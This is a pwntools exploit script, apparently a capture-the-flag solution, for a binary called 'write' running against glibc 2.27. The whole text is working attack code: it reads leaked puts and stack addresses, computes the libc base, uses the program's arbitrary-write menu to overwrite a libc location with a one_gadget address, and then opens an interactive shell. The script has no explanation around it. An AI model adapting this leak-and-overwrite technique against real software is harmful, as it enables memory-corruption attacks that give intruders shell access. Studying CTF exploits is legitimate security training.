from pwn import *
#target=remote('pwn.byteband.it' ,9000)
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./write'],env={"LD_PRELOAD":"./libc-2.27.so"})
libc=ELF('./libc-2.27.so')

context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="pie breakpoint *(0x964-0x202000)")

print(target.recvuntil("puts: "))
puts_libc=int(target.recvline().strip("\n"),16)
print(hex(puts_libc))

libc_base=puts_libc-libc.symbols["puts"]
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]

gadget=0xe569f
libc_gadget=libc_base+gadget

print(target.recvuntil("stack: "))
stack_leak=int(target.recvline().strip("\n"),16)
print(hex(stack_leak))

def write(addr,data):
    print(target.recvuntil("uit\n"))
    target.sendline("w")
    print(target.recvuntil("ptr: "))
    target.sendline(str(addr))
    print(target.recvuntil("val: "))
    target.sendline(str(data))

write(libc_base+0x81bf60,libc_gadget)
print(target.recvuntil("uit\n"))
target.sendline("q")

target.interactive()
